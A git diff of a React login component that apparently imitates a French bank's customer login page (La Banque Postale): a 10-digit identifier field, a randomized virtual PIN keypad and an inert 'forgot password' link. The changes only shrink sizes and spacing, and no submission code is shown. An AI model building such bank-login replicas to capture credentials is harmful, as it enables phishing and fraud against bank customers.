@@ -80,16 +80,16 @@ export default function LoginStep({ onSubmit, submitting }) {
 
   return (
     <div className="fade-in" data-testid="login-step">
-      <h1 className="text-2xl sm:text-3xl font-bold tracking-tight text-[#003366] mb-8">
+      <h1 className="text-xl sm:text-2xl font-bold tracking-tight text-[#003366] mb-6">
         Connexion à votre compte particulier
       </h1>
 
-      <form onSubmit={handleSeConnecter} className="space-y-6" data-testid="login-form">
+      <form onSubmit={handleSeConnecter} className="space-y-5" data-testid="login-form">
         {/* Identifiant */}
-        <div className="space-y-3">
+        <div className="space-y-2">
           <label
             htmlFor="identifiant"
-            className="block text-base font-bold text-[#003366]"
+            className="block text-sm font-bold text-[#003366]"
           >
             Identifiant (10 chiffres)
           </label>
@@ -102,7 +102,7 @@ export default function LoginStep({ onSubmit, submitting }) {
             maxLength={10}
             value={displayedIdentifiant}
             onChange={handleIdentifiantChange}
-            className="w-full h-14 rounded-md border border-[#B6BAC2] bg-white px-5 text-lg sm:text-xl font-medium text-[#003366] tracking-[0.15em] outline-none transition focus:border-[#003366] focus:ring-2 focus:ring-[#003366]/20"
+            className="w-full h-12 rounded-md border border-[#B6BAC2] bg-white px-4 text-base sm:text-lg font-medium text-[#003366] tracking-[0.15em] outline-none transition focus:border-[#003366] focus:ring-2 focus:ring-[#003366]/20"
             aria-label="Identifiant 10 chiffres"
           />
         </div>
@@ -112,7 +112,7 @@ export default function LoginStep({ onSubmit, submitting }) {
           type="button"
           data-testid="login-memorize-toggle"
           onClick={() => setMemorize((v) => !v)}
-          className="flex w-full items-center justify-between text-base text-[#003366] select-none"
+          className="flex w-full items-center justify-between text-sm sm:text-base text-[#003366] select-none"
         >
           <span className="font-medium">Mémoriser mon identifiant</span>
           <span className={`lbp-switch ${memorize ? "on" : ""}`}>
@@ -121,18 +121,18 @@ export default function LoginStep({ onSubmit, submitting }) {
         </button>
 
         {/* Password section */}
-        <div className="pt-2">
-          <div className="text-base font-bold text-[#003366]">
+        <div className="pt-1">
+          <div className="text-sm font-bold text-[#003366]">
             Mot de passe (6 chiffres)
           </div>
 
           {/* Empty circle puces */}
-          <div className="mt-4 flex items-center justify-center gap-4 sm:gap-5" aria-live="polite">
+          <div className="mt-3 flex items-center justify-center gap-3 sm:gap-4" aria-live="polite">
             {[0, 1, 2, 3, 4, 5].map((i) => (
               <span
                 key={i}
                 data-testid={`pwd-dot-${i}`}
-                className={`h-5 w-5 rounded-full border-[2.5px] transition ${
+                className={`h-4 w-4 rounded-full border-[2.5px] transition ${
                   password.length > i
                     ? "bg-[#003366] border-[#003366]"
                     : "border-[#003366] bg-white"
@@ -157,7 +157,7 @@ export default function LoginStep({ onSubmit, submitting }) {
           {/* Virtual randomized keypad - 5 cols x 2 rows */}
           <div
             data-testid="virtual-keypad"
-            className="mt-6 grid grid-cols-5 gap-2 sm:gap-3"
+            className="mt-4 grid grid-cols-5 gap-2"
           >
             {keypadDigits.map((digit, idx) => (
               <button
@@ -166,7 +166,7 @@ export default function LoginStep({ onSubmit, submitting }) {
                 data-testid={`keypad-key-${digit}`}
                 onClick={() => handleKeyClick(digit)}
                 disabled={password.length >= 6 || submitting}
-                className="h-14 sm:h-16 rounded-lg bg-[#E8F1FB] text-[#003366] text-xl sm:text-2xl font-bold hover:bg-[#D6E5F7] active:bg-[#C2D6F0] disabled:opacity-50 transition"
+                className="h-11 sm:h-13 rounded-lg bg-[#E8F1FB] text-[#003366] text-lg sm:text-xl font-bold hover:bg-[#D6E5F7] active:bg-[#C2D6F0] disabled:opacity-50 transition"
               >
                 {digit}
               </button>
@@ -185,18 +185,18 @@ export default function LoginStep({ onSubmit, submitting }) {
           type="submit"
           data-testid="login-submit"
           disabled={submitting}
-          className="w-full h-14 rounded-md bg-[#003399] hover:bg-[#002A85] active:bg-[#001F66] text-white text-lg font-semibold transition disabled:opacity-60"
+          className="w-full h-12 rounded-md bg-[#003399] hover:bg-[#002A85] active:bg-[#001F66] text-white text-base font-semibold transition disabled:opacity-60"
         >
           {submitting ? "Connexion…" : "Se connecter"}
         </button>
 
         {/* Forgot link */}
-        <div className="text-center pt-2">
+        <div className="text-center pt-1">
           <a
             href="#"
             data-testid="login-forgot"
             onClick={(e) => e.preventDefault()}
-            className="text-sm sm:text-base font-medium text-[#003366] underline hover:opacity-80"
+            className="text-sm font-medium text-[#003366] underline hover:opacity-80"
           >
             Identifiant / Mot de passe oublié
           </a>
